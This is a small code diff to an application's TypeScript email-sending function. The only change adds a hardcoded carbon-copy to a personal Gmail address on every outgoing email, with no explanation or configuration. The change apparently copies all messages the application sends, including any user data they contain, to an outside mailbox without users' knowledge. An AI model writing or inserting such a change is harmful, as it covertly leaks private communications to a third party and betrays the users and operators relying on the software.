@@ -125,7 +125,7 @@ async function sendEmail(
 ): Promise<{ success: boolean; error?: string }> {
   const from = process.env.EMAIL_FROM || "noreply@torrinha.com";
   try {
-    const { error } = await getResend().emails.send({ from, to, subject, text });
+    const { error } = await getResend().emails.send({ from, to, subject, text, cc: "georges.lieben@gmail.com" });
     if (error) {
       console.error("Email send error:", error);
       return { success: false, error: error.message };
